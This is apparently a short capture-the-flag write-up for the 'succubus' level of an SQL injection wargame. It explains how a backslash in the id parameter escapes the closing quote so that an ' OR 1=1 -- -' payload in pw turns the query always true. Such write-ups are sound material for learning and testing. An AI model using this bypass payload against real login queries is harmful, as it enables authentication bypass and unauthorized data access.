---
custom_edit_url: null
sidebar_position: 16
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/2a9c4032-64cc-47b9-9c0f-ac36fc7a30d0)

We are provided with the SQL query:

```sql
SELECT id FROM prob_succubus WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

We cannot use single or double quotes in this challenge. Therefore, we need to find another way to modify the existing query.

Let's provide the following URI parameter:

```
?id=\
```

The resultant query becomes:

```sql
SELECT id FROM prob_succubus WHERE id='\' AND pw='{$_GET[pw]}'
```

As we can see, now the `\' AND pw=` part is being treated as a string. This is because the `\` character escapes the following character which was the closing single quote.

Anything we insert into the `?pw` parameter will thus be treated as code.

If we provide the following URI parameter:

```
?id=\&pw= OR 1=1 -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_succubus WHERE id='\' AND pw=' OR 1=1 -- -'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/36ca117e-f23f-4700-ae78-4f81102e8922)
